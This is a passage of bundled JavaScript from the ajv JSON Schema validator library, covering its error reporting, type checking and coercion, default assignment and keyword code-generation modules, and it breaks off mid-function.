    exports2.escapeJsonPointer = escapeJsonPointer;
    function unescapeJsonPointer(str) {
      return str.replace(/~1/g, "/").replace(/~0/g, "~");
    }
    exports2.unescapeJsonPointer = unescapeJsonPointer;
    function eachItem(xs, f) {
      if (Array.isArray(xs)) {
        for (const x of xs)
          f(x);
      } else {
        f(xs);
      }
    }
    exports2.eachItem = eachItem;
    function makeMergeEvaluated({ mergeNames, mergeToName, mergeValues, resultToName }) {
      return (gen, from, to, toName) => {
        const res = to === void 0 ? from : to instanceof codegen_1.Name ? (from instanceof codegen_1.Name ? mergeNames(gen, from, to) : mergeToName(gen, from, to), to) : from instanceof codegen_1.Name ? (mergeToName(gen, to, from), from) : mergeValues(from, to);
        return toName === codegen_1.Name && !(res instanceof codegen_1.Name) ? resultToName(gen, res) : res;
      };
    }
    exports2.mergeEvaluated = {
      props: makeMergeEvaluated({
        mergeNames: (gen, from, to) => gen.if((0, codegen_1._)`${to} !== true && ${from} !== undefined`, () => {
          gen.if((0, codegen_1._)`${from} === true`, () => gen.assign(to, true), () => gen.assign(to, (0, codegen_1._)`${to} || {}`).code((0, codegen_1._)`Object.assign(${to}, ${from})`));
        }),
        mergeToName: (gen, from, to) => gen.if((0, codegen_1._)`${to} !== true`, () => {
          if (from === true) {
            gen.assign(to, true);
          } else {
            gen.assign(to, (0, codegen_1._)`${to} || {}`);
            setEvaluated(gen, to, from);
          }
        }),
        mergeValues: (from, to) => from === true ? true : { ...from, ...to },
        resultToName: evaluatedPropsToName
      }),
      items: makeMergeEvaluated({
        mergeNames: (gen, from, to) => gen.if((0, codegen_1._)`${to} !== true && ${from} !== undefined`, () => gen.assign(to, (0, codegen_1._)`${from} === true ? true : ${to} > ${from} ? ${to} : ${from}`)),
        mergeToName: (gen, from, to) => gen.if((0, codegen_1._)`${to} !== true`, () => gen.assign(to, from === true ? true : (0, codegen_1._)`${to} > ${from} ? ${to} : ${from}`)),
        mergeValues: (from, to) => from === true ? true : Math.max(from, to),
        resultToName: (gen, items) => gen.var("items", items)
      })
    };
    function evaluatedPropsToName(gen, ps) {
      if (ps === true)
        return gen.var("props", true);
      const props = gen.var("props", (0, codegen_1._)`{}`);
      if (ps !== void 0)
        setEvaluated(gen, props, ps);
      return props;
    }
    exports2.evaluatedPropsToName = evaluatedPropsToName;
    function setEvaluated(gen, props, ps) {
      Object.keys(ps).forEach((p) => gen.assign((0, codegen_1._)`${props}${(0, codegen_1.getProperty)(p)}`, true));
    }
    exports2.setEvaluated = setEvaluated;
    var snippets = {};
    function useFunc(gen, f) {
      return gen.scopeValue("func", {
        ref: f,
        code: snippets[f.code] || (snippets[f.code] = new code_1._Code(f.code))
      });
    }
    exports2.useFunc = useFunc;
    var Type;
    (function(Type2) {
      Type2[Type2["Num"] = 0] = "Num";
      Type2[Type2["Str"] = 1] = "Str";
    })(Type || (exports2.Type = Type = {}));
    function getErrorPath(dataProp, dataPropType, jsPropertySyntax) {
      if (dataProp instanceof codegen_1.Name) {
        const isNumber = dataPropType === Type.Num;
        return jsPropertySyntax ? isNumber ? (0, codegen_1._)`"[" + ${dataProp} + "]"` : (0, codegen_1._)`"['" + ${dataProp} + "']"` : isNumber ? (0, codegen_1._)`"/" + ${dataProp}` : (0, codegen_1._)`"/" + ${dataProp}.replace(/~/g, "~0").replace(/\\//g, "~1")`;
      }
      return jsPropertySyntax ? (0, codegen_1.getProperty)(dataProp).toString() : "/" + escapeJsonPointer(dataProp);
    }
    exports2.getErrorPath = getErrorPath;
    function checkStrictMode(it, msg, mode = it.opts.strictSchema) {
      if (!mode)
        return;
      msg = `strict mode: ${msg}`;
      if (mode === true)
        throw new Error(msg);
      it.self.logger.warn(msg);
    }
    exports2.checkStrictMode = checkStrictMode;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/names.js
var require_names = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/names.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var names = {
      // validation function arguments
      data: new codegen_1.Name("data"),
      // data passed to validation function
      // args passed from referencing schema
      valCxt: new codegen_1.Name("valCxt"),
      // validation/data context - should not be used directly, it is destructured to the names below
      instancePath: new codegen_1.Name("instancePath"),
      parentData: new codegen_1.Name("parentData"),
      parentDataProperty: new codegen_1.Name("parentDataProperty"),
      rootData: new codegen_1.Name("rootData"),
      // root data - same as the data passed to the first/top validation function
      dynamicAnchors: new codegen_1.Name("dynamicAnchors"),
      // used to support recursiveRef and dynamicRef
      // function scoped variables
      vErrors: new codegen_1.Name("vErrors"),
      // null or array of validation errors
      errors: new codegen_1.Name("errors"),
      // counter of validation errors
      this: new codegen_1.Name("this"),
      // "globals"
      self: new codegen_1.Name("self"),
      scope: new codegen_1.Name("scope"),
      // JTD serialize/parse name for JSON string and position
      json: new codegen_1.Name("json"),
      jsonPos: new codegen_1.Name("jsonPos"),
      jsonLen: new codegen_1.Name("jsonLen"),
      jsonPart: new codegen_1.Name("jsonPart")
    };
    exports2.default = names;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/errors.js
var require_errors = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/errors.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.extendErrors = exports2.resetErrorsCount = exports2.reportExtraError = exports2.reportError = exports2.keyword$DataError = exports2.keywordError = void 0;
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var names_1 = require_names();
    exports2.keywordError = {
      message: ({ keyword }) => (0, codegen_1.str)`must pass "${keyword}" keyword validation`
    };
    exports2.keyword$DataError = {
      message: ({ keyword, schemaType }) => schemaType ? (0, codegen_1.str)`"${keyword}" keyword must be ${schemaType} ($data)` : (0, codegen_1.str)`"${keyword}" keyword is invalid ($data)`
    };
    function reportError(cxt, error = exports2.keywordError, errorPaths, overrideAllErrors) {
      const { it } = cxt;
      const { gen, compositeRule, allErrors } = it;
      const errObj = errorObjectCode(cxt, error, errorPaths);
      if (overrideAllErrors !== null && overrideAllErrors !== void 0 ? overrideAllErrors : compositeRule || allErrors) {
        addError(gen, errObj);
      } else {
        returnErrors(it, (0, codegen_1._)`[${errObj}]`);
      }
    }
    exports2.reportError = reportError;
    function reportExtraError(cxt, error = exports2.keywordError, errorPaths) {
      const { it } = cxt;
      const { gen, compositeRule, allErrors } = it;
      const errObj = errorObjectCode(cxt, error, errorPaths);
      addError(gen, errObj);
      if (!(compositeRule || allErrors)) {
        returnErrors(it, names_1.default.vErrors);
      }
    }
    exports2.reportExtraError = reportExtraError;
    function resetErrorsCount(gen, errsCount) {
      gen.assign(names_1.default.errors, errsCount);
      gen.if((0, codegen_1._)`${names_1.default.vErrors} !== null`, () => gen.if(errsCount, () => gen.assign((0, codegen_1._)`${names_1.default.vErrors}.length`, errsCount), () => gen.assign(names_1.default.vErrors, null)));
    }
    exports2.resetErrorsCount = resetErrorsCount;
    function extendErrors({ gen, keyword, schemaValue, data, errsCount, it }) {
      if (errsCount === void 0)
        throw new Error("ajv implementation error");
      const err = gen.name("err");
      gen.forRange("i", errsCount, names_1.default.errors, (i) => {
        gen.const(err, (0, codegen_1._)`${names_1.default.vErrors}[${i}]`);
        gen.if((0, codegen_1._)`${err}.instancePath === undefined`, () => gen.assign((0, codegen_1._)`${err}.instancePath`, (0, codegen_1.strConcat)(names_1.default.instancePath, it.errorPath)));
        gen.assign((0, codegen_1._)`${err}.schemaPath`, (0, codegen_1.str)`${it.errSchemaPath}/${keyword}`);
        if (it.opts.verbose) {
          gen.assign((0, codegen_1._)`${err}.schema`, schemaValue);
          gen.assign((0, codegen_1._)`${err}.data`, data);
        }
      });
    }
    exports2.extendErrors = extendErrors;
    function addError(gen, errObj) {
      const err = gen.const("err", errObj);
      gen.if((0, codegen_1._)`${names_1.default.vErrors} === null`, () => gen.assign(names_1.default.vErrors, (0, codegen_1._)`[${err}]`), (0, codegen_1._)`${names_1.default.vErrors}.push(${err})`);
      gen.code((0, codegen_1._)`${names_1.default.errors}++`);
    }
    function returnErrors(it, errs) {
      const { gen, validateName, schemaEnv } = it;
      if (schemaEnv.$async) {
        gen.throw((0, codegen_1._)`new ${it.ValidationError}(${errs})`);
      } else {
        gen.assign((0, codegen_1._)`${validateName}.errors`, errs);
        gen.return(false);
      }
    }
    var E = {
      keyword: new codegen_1.Name("keyword"),
      schemaPath: new codegen_1.Name("schemaPath"),
      // also used in JTD errors
      params: new codegen_1.Name("params"),
      propertyName: new codegen_1.Name("propertyName"),
      message: new codegen_1.Name("message"),
      schema: new codegen_1.Name("schema"),
      parentSchema: new codegen_1.Name("parentSchema")
    };
    function errorObjectCode(cxt, error, errorPaths) {
      const { createErrors } = cxt.it;
      if (createErrors === false)
        return (0, codegen_1._)`{}`;
      return errorObject(cxt, error, errorPaths);
    }
    function errorObject(cxt, error, errorPaths = {}) {
      const { gen, it } = cxt;
      const keyValues = [
        errorInstancePath(it, errorPaths),
        errorSchemaPath(cxt, errorPaths)
      ];
      extraErrorProps(cxt, error, keyValues);
      return gen.object(...keyValues);
    }
    function errorInstancePath({ errorPath }, { instancePath }) {
      const instPath = instancePath ? (0, codegen_1.str)`${errorPath}${(0, util_1.getErrorPath)(instancePath, util_1.Type.Str)}` : errorPath;
      return [names_1.default.instancePath, (0, codegen_1.strConcat)(names_1.default.instancePath, instPath)];
    }
    function errorSchemaPath({ keyword, it: { errSchemaPath } }, { schemaPath, parentSchema }) {
      let schPath = parentSchema ? errSchemaPath : (0, codegen_1.str)`${errSchemaPath}/${keyword}`;
      if (schemaPath) {
        schPath = (0, codegen_1.str)`${schPath}${(0, util_1.getErrorPath)(schemaPath, util_1.Type.Str)}`;
      }
      return [E.schemaPath, schPath];
    }
    function extraErrorProps(cxt, { params, message }, keyValues) {
      const { keyword, data, schemaValue, it } = cxt;
      const { opts, propertyName, topSchemaRef, schemaPath } = it;
      keyValues.push([E.keyword, keyword], [E.params, typeof params == "function" ? params(cxt) : params || (0, codegen_1._)`{}`]);
      if (opts.messages) {
        keyValues.push([E.message, typeof message == "function" ? message(cxt) : message]);
      }
      if (opts.verbose) {
        keyValues.push([E.schema, schemaValue], [E.parentSchema, (0, codegen_1._)`${topSchemaRef}${schemaPath}`], [names_1.default.data, data]);
      }
      if (propertyName)
        keyValues.push([E.propertyName, propertyName]);
    }
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/boolSchema.js
var require_boolSchema = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/boolSchema.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.boolOrEmptySchema = exports2.topBoolOrEmptySchema = void 0;
    var errors_1 = require_errors();
    var codegen_1 = require_codegen();
    var names_1 = require_names();
    var boolError = {
      message: "boolean schema is false"
    };
    function topBoolOrEmptySchema(it) {
      const { gen, schema, validateName } = it;
      if (schema === false) {
        falseSchemaError(it, false);
      } else if (typeof schema == "object" && schema.$async === true) {
        gen.return(names_1.default.data);
      } else {
        gen.assign((0, codegen_1._)`${validateName}.errors`, null);
        gen.return(true);
      }
    }
    exports2.topBoolOrEmptySchema = topBoolOrEmptySchema;
    function boolOrEmptySchema(it, valid5) {
      const { gen, schema } = it;
      if (schema === false) {
        gen.var(valid5, false);
        falseSchemaError(it);
      } else {
        gen.var(valid5, true);
      }
    }
    exports2.boolOrEmptySchema = boolOrEmptySchema;
    function falseSchemaError(it, overrideAllErrors) {
      const { gen, data } = it;
      const cxt = {
        gen,
        keyword: "false schema",
        data,
        schema: false,
        schemaCode: false,
        schemaValue: false,
        params: {},
        it
      };
      (0, errors_1.reportError)(cxt, boolError, void 0, overrideAllErrors);
    }
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/rules.js
var require_rules = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/rules.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.getRules = exports2.isJSONType = void 0;
    var _jsonTypes = ["string", "number", "integer", "boolean", "null", "object", "array"];
    var jsonTypes = new Set(_jsonTypes);
    function isJSONType(x) {
      return typeof x == "string" && jsonTypes.has(x);
    }
    exports2.isJSONType = isJSONType;
    function getRules() {
      const groups = {
        number: { type: "number", rules: [] },
        string: { type: "string", rules: [] },
        array: { type: "array", rules: [] },
        object: { type: "object", rules: [] }
      };
      return {
        types: { ...groups, integer: true, boolean: true, null: true },
        rules: [{ rules: [] }, groups.number, groups.string, groups.array, groups.object],
        post: { rules: [] },
        all: {},
        keywords: {}
      };
    }
    exports2.getRules = getRules;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/applicability.js
var require_applicability = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/applicability.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.shouldUseRule = exports2.shouldUseGroup = exports2.schemaHasRulesForType = void 0;
    function schemaHasRulesForType({ schema, self }, type) {
      const group = self.RULES.types[type];
      return group && group !== true && shouldUseGroup(schema, group);
    }
    exports2.schemaHasRulesForType = schemaHasRulesForType;
    function shouldUseGroup(schema, group) {
      return group.rules.some((rule) => shouldUseRule(schema, rule));
    }
    exports2.shouldUseGroup = shouldUseGroup;
    function shouldUseRule(schema, rule) {
      var _a;
      return schema[rule.keyword] !== void 0 || ((_a = rule.definition.implements) === null || _a === void 0 ? void 0 : _a.some((kwd) => schema[kwd] !== void 0));
    }
    exports2.shouldUseRule = shouldUseRule;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/dataType.js
var require_dataType = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/dataType.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.reportTypeError = exports2.checkDataTypes = exports2.checkDataType = exports2.coerceAndCheckDataType = exports2.getJSONTypes = exports2.getSchemaTypes = exports2.DataType = void 0;
    var rules_1 = require_rules();
    var applicability_1 = require_applicability();
    var errors_1 = require_errors();
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var DataType;
    (function(DataType2) {
      DataType2[DataType2["Correct"] = 0] = "Correct";
      DataType2[DataType2["Wrong"] = 1] = "Wrong";
    })(DataType || (exports2.DataType = DataType = {}));
    function getSchemaTypes(schema) {
      const types = getJSONTypes(schema.type);
      const hasNull = types.includes("null");
      if (hasNull) {
        if (schema.nullable === false)
          throw new Error("type: null contradicts nullable: false");
      } else {
        if (!types.length && schema.nullable !== void 0) {
          throw new Error('"nullable" cannot be used without "type"');
        }
        if (schema.nullable === true)
          types.push("null");
      }
      return types;
    }
    exports2.getSchemaTypes = getSchemaTypes;
    function getJSONTypes(ts) {
      const types = Array.isArray(ts) ? ts : ts ? [ts] : [];
      if (types.every(rules_1.isJSONType))
        return types;
      throw new Error("type must be JSONType or JSONType[]: " + types.join(","));
    }
    exports2.getJSONTypes = getJSONTypes;
    function coerceAndCheckDataType(it, types) {
      const { gen, data, opts } = it;
      const coerceTo = coerceToTypes(types, opts.coerceTypes);
      const checkTypes = types.length > 0 && !(coerceTo.length === 0 && types.length === 1 && (0, applicability_1.schemaHasRulesForType)(it, types[0]));
      if (checkTypes) {
        const wrongType = checkDataTypes(types, data, opts.strictNumbers, DataType.Wrong);
        gen.if(wrongType, () => {
          if (coerceTo.length)
            coerceData(it, types, coerceTo);
          else
            reportTypeError(it);
        });
      }
      return checkTypes;
    }
    exports2.coerceAndCheckDataType = coerceAndCheckDataType;
    var COERCIBLE = /* @__PURE__ */ new Set(["string", "number", "integer", "boolean", "null"]);
    function coerceToTypes(types, coerceTypes) {
      return coerceTypes ? types.filter((t) => COERCIBLE.has(t) || coerceTypes === "array" && t === "array") : [];
    }
    function coerceData(it, types, coerceTo) {
      const { gen, data, opts } = it;
      const dataType = gen.let("dataType", (0, codegen_1._)`typeof ${data}`);
      const coerced = gen.let("coerced", (0, codegen_1._)`undefined`);
      if (opts.coerceTypes === "array") {
        gen.if((0, codegen_1._)`${dataType} == 'object' && Array.isArray(${data}) && ${data}.length == 1`, () => gen.assign(data, (0, codegen_1._)`${data}[0]`).assign(dataType, (0, codegen_1._)`typeof ${data}`).if(checkDataTypes(types, data, opts.strictNumbers), () => gen.assign(coerced, data)));
      }
      gen.if((0, codegen_1._)`${coerced} !== undefined`);
      for (const t of coerceTo) {
        if (COERCIBLE.has(t) || t === "array" && opts.coerceTypes === "array") {
          coerceSpecificType(t);
        }
      }
      gen.else();
      reportTypeError(it);
      gen.endIf();
      gen.if((0, codegen_1._)`${coerced} !== undefined`, () => {
        gen.assign(data, coerced);
        assignParentData(it, coerced);
      });
      function coerceSpecificType(t) {
        switch (t) {
          case "string":
            gen.elseIf((0, codegen_1._)`${dataType} == "number" || ${dataType} == "boolean"`).assign(coerced, (0, codegen_1._)`"" + ${data}`).elseIf((0, codegen_1._)`${data} === null`).assign(coerced, (0, codegen_1._)`""`);
            return;
          case "number":
            gen.elseIf((0, codegen_1._)`${dataType} == "boolean" || ${data} === null
              || (${dataType} == "string" && ${data} && ${data} == +${data})`).assign(coerced, (0, codegen_1._)`+${data}`);
            return;
          case "integer":
            gen.elseIf((0, codegen_1._)`${dataType} === "boolean" || ${data} === null
              || (${dataType} === "string" && ${data} && ${data} == +${data} && !(${data} % 1))`).assign(coerced, (0, codegen_1._)`+${data}`);
            return;
          case "boolean":
            gen.elseIf((0, codegen_1._)`${data} === "false" || ${data} === 0 || ${data} === null`).assign(coerced, false).elseIf((0, codegen_1._)`${data} === "true" || ${data} === 1`).assign(coerced, true);
            return;
          case "null":
            gen.elseIf((0, codegen_1._)`${data} === "" || ${data} === 0 || ${data} === false`);
            gen.assign(coerced, null);
            return;
          case "array":
            gen.elseIf((0, codegen_1._)`${dataType} === "string" || ${dataType} === "number"
              || ${dataType} === "boolean" || ${data} === null`).assign(coerced, (0, codegen_1._)`[${data}]`);
        }
      }
    }
    function assignParentData({ gen, parentData, parentDataProperty }, expr) {
      gen.if((0, codegen_1._)`${parentData} !== undefined`, () => gen.assign((0, codegen_1._)`${parentData}[${parentDataProperty}]`, expr));
    }
    function checkDataType(dataType, data, strictNums, correct = DataType.Correct) {
      const EQ = correct === DataType.Correct ? codegen_1.operators.EQ : codegen_1.operators.NEQ;
      let cond;
      switch (dataType) {
        case "null":
          return (0, codegen_1._)`${data} ${EQ} null`;
        case "array":
          cond = (0, codegen_1._)`Array.isArray(${data})`;
          break;
        case "object":
          cond = (0, codegen_1._)`${data} && typeof ${data} == "object" && !Array.isArray(${data})`;
          break;
        case "integer":
          cond = numCond((0, codegen_1._)`!(${data} % 1) && !isNaN(${data})`);
          break;
        case "number":
          cond = numCond();
          break;
        default:
          return (0, codegen_1._)`typeof ${data} ${EQ} ${dataType}`;
      }
      return correct === DataType.Correct ? cond : (0, codegen_1.not)(cond);
      function numCond(_cond = codegen_1.nil) {
        return (0, codegen_1.and)((0, codegen_1._)`typeof ${data} == "number"`, _cond, strictNums ? (0, codegen_1._)`isFinite(${data})` : codegen_1.nil);
      }
    }
    exports2.checkDataType = checkDataType;
    function checkDataTypes(dataTypes, data, strictNums, correct) {
      if (dataTypes.length === 1) {
        return checkDataType(dataTypes[0], data, strictNums, correct);
      }
      let cond;
      const types = (0, util_1.toHash)(dataTypes);
      if (types.array && types.object) {
        const notObj = (0, codegen_1._)`typeof ${data} != "object"`;
        cond = types.null ? notObj : (0, codegen_1._)`!${data} || ${notObj}`;
        delete types.null;
        delete types.array;
        delete types.object;
      } else {
        cond = codegen_1.nil;
      }
      if (types.number)
        delete types.integer;
      for (const t in types)
        cond = (0, codegen_1.and)(cond, checkDataType(t, data, strictNums, correct));
      return cond;
    }
    exports2.checkDataTypes = checkDataTypes;
    var typeError = {
      message: ({ schema }) => `must be ${schema}`,
      params: ({ schema, schemaValue }) => typeof schema == "string" ? (0, codegen_1._)`{type: ${schema}}` : (0, codegen_1._)`{type: ${schemaValue}}`
    };
    function reportTypeError(it) {
      const cxt = getTypeErrorContext(it);
      (0, errors_1.reportError)(cxt, typeError);
    }
    exports2.reportTypeError = reportTypeError;
    function getTypeErrorContext(it) {
      const { gen, data, schema } = it;
      const schemaCode = (0, util_1.schemaRefOrVal)(it, schema, "type");
      return {
        gen,
        keyword: "type",
        data,
        schema: schema.type,
        schemaCode,
        schemaValue: schemaCode,
        parentSchema: schema,
        params: {},
        it
      };
    }
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/defaults.js
var require_defaults = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/defaults.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.assignDefaults = void 0;
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    function assignDefaults(it, ty) {
      const { properties, items } = it.schema;
      if (ty === "object" && properties) {
        for (const key in properties) {
          assignDefault(it, key, properties[key].default);
        }
      } else if (ty === "array" && Array.isArray(items)) {
        items.forEach((sch, i) => assignDefault(it, i, sch.default));
      }
    }
    exports2.assignDefaults = assignDefaults;
    function assignDefault(it, prop, defaultValue) {
      const { gen, compositeRule, data, opts } = it;
      if (defaultValue === void 0)
        return;
      const childData = (0, codegen_1._)`${data}${(0, codegen_1.getProperty)(prop)}`;
      if (compositeRule) {
        (0, util_1.checkStrictMode)(it, `default is ignored for: ${childData}`);
        return;
      }
      let condition = (0, codegen_1._)`${childData} === undefined`;
      if (opts.useDefaults === "empty") {
        condition = (0, codegen_1._)`${condition} || ${childData} === null || ${childData} === ""`;
      }
      gen.if(condition, (0, codegen_1._)`${childData} = ${(0, codegen_1.stringify)(defaultValue)}`);
    }
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/code.js
var require_code2 = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/code.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.validateUnion = exports2.validateArray = exports2.usePattern = exports2.callValidateCode = exports2.schemaProperties = exports2.allSchemaProperties = exports2.noPropertyInData = exports2.propertyInData = exports2.isOwnProperty = exports2.hasPropFunc = exports2.reportMissingProp = exports2.checkMissingProp = exports2.checkReportMissingProp = void 0;
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var names_1 = require_names();
    var util_2 = require_util();
    function checkReportMissingProp(cxt, prop) {
      const { gen, data, it } = cxt;
      gen.if(noPropertyInData(gen, data, prop, it.opts.ownProperties), () => {
        cxt.setParams({ missingProperty: (0, codegen_1._)`${prop}` }, true);
        cxt.error();
      });
    }
    exports2.checkReportMissingProp = checkReportMissingProp;
    function checkMissingProp({ gen, data, it: { opts } }, properties, missing) {
      return (0, codegen_1.or)(...properties.map((prop) => (0, codegen_1.and)(noPropertyInData(gen, data, prop, opts.ownProperties), (0, codegen_1._)`${missing} = ${prop}`)));
    }
    exports2.checkMissingProp = checkMissingProp;
    function reportMissingProp(cxt, missing) {
      cxt.setParams({ missingProperty: missing }, true);
      cxt.error();
    }
    exports2.reportMissingProp = reportMissingProp;
    function hasPropFunc(gen) {
      return gen.scopeValue("func", {
        // eslint-disable-next-line @typescript-eslint/unbound-method
        ref: Object.prototype.hasOwnProperty,
        code: (0, codegen_1._)`Object.prototype.hasOwnProperty`
      });
    }
    exports2.hasPropFunc = hasPropFunc;
    function isOwnProperty(gen, data, property) {
      return (0, codegen_1._)`${hasPropFunc(gen)}.call(${data}, ${property})`;
    }
    exports2.isOwnProperty = isOwnProperty;
    function propertyInData(gen, data, property, ownProperties) {
      const cond = (0, codegen_1._)`${data}${(0, codegen_1.getProperty)(property)} !== undefined`;
      return ownProperties ? (0, codegen_1._)`${cond} && ${isOwnProperty(gen, data, property)}` : cond;
    }
    exports2.propertyInData = propertyInData;
    function noPropertyInData(gen, data, property, ownProperties) {
      const cond = (0, codegen_1._)`${data}${(0, codegen_1.getProperty)(property)} === undefined`;
      return ownProperties ? (0, codegen_1.or)(cond, (0, codegen_1.not)(isOwnProperty(gen, data, property))) : cond;
    }
    exports2.noPropertyInData = noPropertyInData;
    function allSchemaProperties(schemaMap) {
      return schemaMap ? Object.keys(schemaMap).filter((p) => p !== "__proto__") : [];
    }
    exports2.allSchemaProperties = allSchemaProperties;
    function schemaProperties(it, schemaMap) {
      return allSchemaProperties(schemaMap).filter((p) => !(0, util_1.alwaysValidSchema)(it, schemaMap[p]));
    }
    exports2.schemaProperties = schemaProperties;
    function callValidateCode({ schemaCode, data, it: { gen, topSchemaRef, schemaPath, errorPath }, it }, func, context, passSchema) {
      const dataAndSchema = passSchema ? (0, codegen_1._)`${schemaCode}, ${data}, ${topSchemaRef}${schemaPath}` : data;
      const valCxt = [
        [names_1.default.instancePath, (0, codegen_1.strConcat)(names_1.default.instancePath, errorPath)],
        [names_1.default.parentData, it.parentData],
        [names_1.default.parentDataProperty, it.parentDataProperty],
        [names_1.default.rootData, names_1.default.rootData]
      ];
      if (it.opts.dynamicRef)
        valCxt.push([names_1.default.dynamicAnchors, names_1.default.dynamicAnchors]);
      const args = (0, codegen_1._)`${dataAndSchema}, ${gen.object(...valCxt)}`;
      return context !== codegen_1.nil ? (0, codegen_1._)`${func}.call(${context}, ${args})` : (0, codegen_1._)`${func}(${args})`;
    }
    exports2.callValidateCode = callValidateCode;
    var newRegExp = (0, codegen_1._)`new RegExp`;
    function usePattern({ gen, it: { opts } }, pattern) {
      const u = opts.unicodeRegExp ? "u" : "";
      const { regExp } = opts.code;
      const rx = regExp(pattern, u);
      return gen.scopeValue("pattern", {
        key: rx.toString(),
        ref: rx,
        code: (0, codegen_1._)`${regExp.code === "new RegExp" ? newRegExp : (0, util_2.useFunc)(gen, regExp)}(${pattern}, ${u})`
      });
    }
    exports2.usePattern = usePattern;
    function validateArray(cxt) {
      const { gen, data, keyword, it } = cxt;
      const valid5 = gen.name("valid");
      if (it.allErrors) {
        const validArr = gen.let("valid", true);
        validateItems(() => gen.assign(validArr, false));
        return validArr;
      }
      gen.var(valid5, true);
      validateItems(() => gen.break());
      return valid5;
      function validateItems(notValid) {
        const len = gen.const("len", (0, codegen_1._)`${data}.length`);
        gen.forRange("i", 0, len, (i) => {
          cxt.subschema({
            keyword,
            dataProp: i,
            dataPropType: util_1.Type.Num
          }, valid5);
          gen.if((0, codegen_1.not)(valid5), notValid);
        });
      }
    }
    exports2.validateArray = validateArray;
    function validateUnion(cxt) {
      const { gen, schema, keyword, it } = cxt;
      if (!Array.isArray(schema))
        throw new Error("ajv implementation error");
      const alwaysValid = schema.some((sch) => (0, util_1.alwaysValidSchema)(it, sch));
      if (alwaysValid && !it.opts.unevaluated)
        return;
      const valid5 = gen.let("valid", false);
      const schValid = gen.name("_valid");
      gen.block(() => schema.forEach((_sch, i) => {
        const schCxt = cxt.subschema({
          keyword,
          schemaProp: i,
          compositeRule: true
        }, schValid);
        gen.assign(valid5, (0, codegen_1._)`${valid5} || ${schValid}`);
        const merged = cxt.mergeValidEvaluated(schCxt, schValid);
        if (!merged)
          gen.if((0, codegen_1.not)(valid5));
      }));
      cxt.result(valid5, () => cxt.reset(), () => cxt.error(true));
    }
    exports2.validateUnion = validateUnion;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/keyword.js
var require_keyword = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/compile/validate/keyword.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.validateKeywordUsage = exports2.validSchemaType = exports2.funcKeywordCode = exports2.macroKeywordCode = void 0;
    var codegen_1 = require_codegen();
    var names_1 = require_names();
    var code_1 = require_code2();
    var errors_1 = require_errors();
    function macroKeywordCode(cxt, def) {
      const { gen, keyword, schema, parentSchema, it } = cxt;
      const macroSchema = def.macro.call(it.self, schema, parentSchema, it);
      const schemaRef = useKeyword(gen, keyword, macroSchema);
      if (it.opts.validateSchema !== false)
        it.self.validateSchema(macroSchema, true);
      const valid5 = gen.name("valid");
      cxt.subschema({
        schema: macroSchema,
        schemaPath: codegen_1.nil,
        errSchemaPath: `${it.errSchemaPath}/${keyword}`,
        topSchemaRef: schemaRef,
        compositeRule: true
      }, valid5);
      cxt.pass(valid5, () => cxt.error(true));
    }
    exports2.macroKeywordCode = macroKeywordCode;
    function funcKeywordCode(cxt, def) {
      var _a;
      const { gen, keyword, schema, parentSchema, $data, it } = cxt;
      checkAsyncKeyword(it, def);
      const validate = !$data && def.compile ? def.compile.call(it.self, schema, parentSchema, it) : def.validate;
      const validateRef = useKeyword(gen, keyword, validate);
      const valid5 = gen.let("valid");
      cxt.block$data(valid5, validateKeyword);
      cxt.ok((_a = def.valid) !== null && _a !== void 0 ? _a : valid5);
      function validateKeyword() {
        if (def.errors === false) {
          assignValid();
          if (def.modifying)
            modifyData(cxt);
          reportErrs(() => cxt.error());
        } else {
          const ruleErrs = def.async ? validateAsync() : validateSync();
          if (def.modifying)
            modifyData(cxt);
          reportErrs(() => addErrs(cxt, ruleErrs));
        }
      }
      function validateAsync() {
        const ruleErrs = gen.let("ruleErrs", null);
        gen.try(() => assignValid((0, codegen_1._)`await `), (e) => gen.assign(valid5, false).if((0, codegen_1._)`${e} instanceof ${it.ValidationError}`, () => gen.assign(ruleErrs, (0, codegen_1._)`${e}.errors`), () => gen.throw(e)));
        return ruleErrs;
      }
      function validateSync() {
